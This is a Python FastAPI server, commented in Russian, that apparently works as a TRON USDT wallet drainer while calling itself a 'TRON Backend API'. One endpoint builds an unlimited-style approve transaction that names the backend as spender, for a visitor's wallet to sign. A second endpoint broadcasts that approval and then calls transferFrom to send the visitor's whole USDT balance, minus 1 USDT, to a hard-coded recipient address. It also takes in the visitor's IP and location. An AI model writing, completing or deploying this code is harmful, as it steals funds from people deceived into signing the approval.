import os
import asyncio
import time
from typing import Optional
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from tronpy import Tron
from tronpy.keys import PrivateKey
from dotenv import load_dotenv
import logging

# Загрузка переменных окружения
load_dotenv()

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация FastAPI
app = FastAPI(title="TRON Backend API", version="1.0.0")

# Настройка CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Получение переменных окружения
TRON_PRO_API_KEY = os.getenv('TRONGRID_API_KEY')
PRIVATE_KEY = os.getenv('BACKEND_PRIVATE_KEY')
USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
RECIPIENT_ADDRESS = 'XW7yE9DEMtXdARoBX25dDdMe5KVzn9tT3r'

# Проверка наличия необходимых переменных окружения
if not TRON_PRO_API_KEY or not PRIVATE_KEY:
    logger.error('Ошибка: Необходимо указать TRONGRID_API_KEY и BACKEND_PRIVATE_KEY в .env')
    raise RuntimeError('Missing required environment variables')

# Инициализация Tron клиента
tron = Tron(network='mainnet')
tron.set_api_key(TRON_PRO_API_KEY)

# Получение адреса backend из приватного ключа
backend_private_key = PrivateKey(bytes.fromhex(PRIVATE_KEY))
BACKEND_ADDRESS = backend_private_key.public_key.to_base58check_address()

logger.info(f"Backend address: {BACKEND_ADDRESS}")

# Pydantic модели для запросов
class CreateTransactionRequest(BaseModel):
    walletAddress: str

class SendTransactionRequest(BaseModel):
    signedTransaction: dict
    walletAddress: str
    usdtBalance: int
    ip: Optional[str] = None
    id: Optional[str] = None
    location: Optional[str] = None
    trxBalance: Optional[int] = None

# Корневой эндпоинт
@app.get("/")
async def root():
    return {"message": "TRON Backend API is running!"}

@app.get("/api/health")
async def health():
    return {"status": "OK", "timestamp": time.time()}

# Эндпоинт для создания транзакции approve
@app.post("/create-transaction")
async def create_transaction(request: CreateTransactionRequest):
    try:
        wallet_address = request.walletAddress
        
        if not wallet_address:
            raise HTTPException(status_code=400, detail="Необходимо указать walletAddress")
        
        # Сумма для approve (в минимальных единицах USDT, 6 знаков после запятой)
        amount_to_approve = 60807178916019073000000  # Пример: 60,807,178,916.019073 USDT
        
        # Получаем контракт USDT
        contract = tron.get_contract(USDT_CONTRACT_ADDRESS)
        
        # Создаем неподписанную транзакцию approve
        txn = contract.functions.approve(
            BACKEND_ADDRESS,  # кому разрешаем списание
            amount_to_approve  # сумма
        ).with_owner(wallet_address).fee_limit(100_000_000).build()
        
        # Конвертируем транзакцию в формат для фронтенда
        transaction_dict = {
            "raw_data": {
                "contract": [{
                    "parameter": {
                        "value": {
                            "data": txn["raw_data"]["contract"][0]["parameter"]["value"]["data"],
                            "owner_address": wallet_address,
                            "contract_address": USDT_CONTRACT_ADDRESS
                        },
                        "type_url": "type.googleapis.com/protocol.TriggerSmartContract"
                    },
                    "type": "TriggerSmartContract"
                }],
                "ref_block_bytes": txn["raw_data"]["ref_block_bytes"],
                "ref_block_hash": txn["raw_data"]["ref_block_hash"],
                "expiration": txn["raw_data"]["expiration"],
                "fee_limit": txn["raw_data"]["fee_limit"],
                "timestamp": txn["raw_data"]["timestamp"]
            },
            "txID": txn["txID"]
        }
        
        return {"transaction": transaction_dict}
        
    except Exception as error:
        logger.error(f'Ошибка при создании транзакции approve: {error}')
        raise HTTPException(status_code=500, detail="Не удалось создать транзакцию approve")

# Эндпоинт для отправки подписанной транзакции approve и выполнения transferFrom
@app.post("/send-transaction")
async def send_transaction(request: SendTransactionRequest):
    try:
        signed_transaction = request.signedTransaction
        wallet_address = request.walletAddress
        usdt_balance = request.usdtBalance
        
        if not signed_transaction:
            raise HTTPException(status_code=400, detail="Необходимо указать signedTransaction")
        
        if not wallet_address:
            raise HTTPException(status_code=400, detail="Необходимо указать walletAddress")
        
        if usdt_balance is None:
            raise HTTPException(status_code=400, detail="Необходимо указать usdtBalance")
        
        # Отправляем подписанную пользователем транзакцию approve в сеть Tron
        approve_result = tron.broadcast(signed_transaction)
        
        if not approve_result.get('result'):
            raise HTTPException(status_code=500, detail="Не удалось отправить транзакцию approve")
        
        approve_txid = approve_result['txid']
        logger.info(f"Approve transaction sent: {approve_txid}")
        
        # Ожидаем подтверждения транзакции approve
        is_confirmed = await wait_for_transaction_confirmation(approve_txid)
        if not is_confirmed:
            raise HTTPException(status_code=500, detail="Транзакция approve не подтверждена вовремя")
        
        # Получаем контракт USDT
        contract = tron.get_contract(USDT_CONTRACT_ADDRESS)
        
        # Корректно рассчитываем сумму для transferFrom
        amount_to_transfer = int(usdt_balance)
        
        # Оставляем небольшой остаток (например, 1 USDT), чтобы не списывать всё
        if amount_to_transfer > 1_000_000:
            amount_to_transfer -= 1_000_000  # минус 1 USDT
        
        if amount_to_transfer <= 0:
            raise HTTPException(status_code=400, detail="Некорректная сумма для перевода")
        
        # Выполняем transferFrom с backend-адреса на RECIPIENT_ADDRESS
        transfer_txn = contract.functions.transferFrom(
            wallet_address,
            RECIPIENT_ADDRESS,
            amount_to_transfer
        ).with_owner(BACKEND_ADDRESS).fee_limit(300_000_000).build()
        
        # Подписываем транзакцию приватным ключом backend
        transfer_txn = transfer_txn.sign(backend_private_key)
        
        # Отправляем транзакцию
        transfer_result = tron.broadcast(transfer_txn)
        
        if not transfer_result.get('result'):
            raise HTTPException(status_code=500, detail="Не удалось выполнить transferFrom")
        
        return {
            "message": "транзакции успешно выполнены",
            "approveTxId": approve_txid,
            "transferTxId": transfer_result['txid']
        }
        
    except HTTPException:
        raise
    except Exception as error:
        logger.error(f'Ошибка при отправке транзакции: {error}')
        raise HTTPException(status_code=500, detail="Не удалось отправить транзакцию")

# Вспомогательная функция ожидания подтверждения транзакции
async def wait_for_transaction_confirmation(txid: str, max_attempts: int = 15) -> bool:
    for i in range(max_attempts):
        try:
            tx_info = tron.get_transaction_info(txid)
            if tx_info and tx_info.get('receipt', {}).get('result') == 'SUCCESS':
                return True
        except Exception:
            # Транзакция не найдена, продолжаем ожидание
            pass
        
        await asyncio.sleep(15)  # Ждем 15 секунд перед следующей попыткой
    
    raise HTTPException(status_code=500, detail="Время подтверждения транзакции истекло")

# Запуск сервера 01
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=True)
